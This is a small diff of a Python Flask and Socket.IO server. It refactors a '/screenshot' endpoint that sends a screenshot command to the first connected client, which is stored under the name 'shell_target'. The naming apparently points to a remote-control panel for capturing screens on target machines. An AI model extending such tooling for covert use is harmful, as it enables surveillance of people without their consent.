@@ -125,12 +125,10 @@ def handle_message(message):
 @app.route('/screenshot', methods=['POST'])
 def send_message():
     data = request.json.get('data')
-    print(data)
     if data == 'screenshot':
-        sio.emit('message', 'screenshot', room=list(shell_target.keys())[0])
+        room_id = list(shell_target.keys())[0]
+        sio.emit('message', 'screenshot', room=room_id)
         return jsonify({'message': 'Screenshot message sent.'})
-    else:
-        return jsonify({'message': 'Unknown message type.'})
 
 
 @sio.on('disconnect')
